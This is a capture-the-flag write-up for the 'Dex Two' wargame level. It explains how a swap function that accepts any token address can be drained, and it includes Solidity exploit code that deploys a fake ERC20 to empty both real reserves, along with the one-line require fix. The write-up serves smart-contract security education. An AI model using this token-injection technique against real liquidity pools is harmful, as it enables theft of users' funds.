# Level 23: Dex Two

**Target:** [DexTwo.sol](./DexTwo.sol)
**Exploit:** [exploit.sol](./exploit.sol)

## Vulnerability

Missing token whitelist. The `swap()` function in Dex Two accepts any ERC20 address as `from` or `to` — it does not verify that the tokens are the official `token1` or `token2`. An attacker can deploy a fake ERC20, seed the pool with it, and use the pool's own pricing formula to drain both real token reserves in two swaps.

## Key Concepts

**What Dex (Level 22) had that Dex Two removed:**
```solidity
// Dex (Level 22) — safe guard:
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

// Dex Two — this require is gone.
```

Without this check, `from` and `to` can be any address that implements the `balanceOf` / `transferFrom` interface.

**Pricing formula exploit:** The formula is unchanged:
```solidity
(amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))
```

If `from` is the attacker's fake token and the pool holds 100 fake tokens (seeded by the attacker), swapping 100 fake tokens yields:
```
output = (100 * 100_real_tokens) / 100_fake_tokens = 100 real tokens
```
The entire real token reserve is drained in a single swap. Repeat for the second token.

**Constructor-time seeding:** The `MockErc20` constructor pre-mints 100 tokens directly to the target (DEX) address, establishing the fake reserve needed for the formula to work. No `add_liquidity` needed.

## Exploit

```solidity
contract MockErc20 {
    constructor() {
        address target = 0x...;
        _balances[msg.sender] = 1000;
        _balances[target] = 100;               // seed DEX with 100 fake tokens
        _allowances[msg.sender][target] = type(uint256).max;
    }
    // ... standard ERC20 implementation
}

contract Exploit {
    function attack() external {
        address mock = address(new MockErc20());  // deploy fake token, seeds DEX in constructor
        address token1 = IExploit(target).token1();
        address token2 = IExploit(target).token2();

        // Swap 100 fake → drain all token1 (100 fake in pool → outputs 100 token1)
        uint256 mockInPool = IExploit(mock).balanceOf(target);
        IExploit(target).swap(mock, token1, mockInPool);

        // Swap remaining fake → drain all token2
        mockInPool = IExploit(mock).balanceOf(target);
        IExploit(target).swap(mock, token2, mockInPool);
    }
}
```

Both reserves drained in 2 transactions (1 Foundry broadcast).

## Root Cause

Trusting caller-supplied token addresses without validation. Any protocol that uses untrusted external addresses as parameters in financial calculations (pricing, liquidity, rates) is vulnerable to this class of attack. The missing whitelist check is a single `require` that would have prevented the entire exploit.

## Real-World Reference

Token injection attacks — using a custom ERC20 to manipulate pool math — are a common DeFi attack vector. The **Rari Capital / Fuse hack (2022, $80M)** involved a reentrancy via a non-standard ERC20 token that was accepted by the protocol without validation. More directly, several small AMM forks have been drained by attackers adding fake tokens to pools and exploiting the naive pricing formula, exactly as demonstrated here.
